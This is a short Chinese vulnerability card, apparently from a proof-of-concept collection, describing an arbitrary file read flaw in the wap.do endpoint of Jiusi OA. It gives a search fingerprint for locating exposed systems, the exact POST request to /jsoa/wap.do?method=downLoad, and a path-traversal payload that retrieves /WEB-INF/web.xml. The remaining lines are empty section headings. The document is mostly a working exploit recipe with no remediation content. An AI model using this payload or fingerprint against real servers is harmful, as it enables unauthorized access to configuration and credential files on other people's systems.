# 九思OAwap.do存在任意文件读取漏洞

- **系统**：九思　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`web.body="/jsoa/webmail/ajax_util.js"`
- **请求**：`POST /jsoa/wap.do?method=downLoad HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
path=../&name=&FileName=/WEB-INF/web.xml
```

**其他**
- 九思OA wap.do 存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 九思OA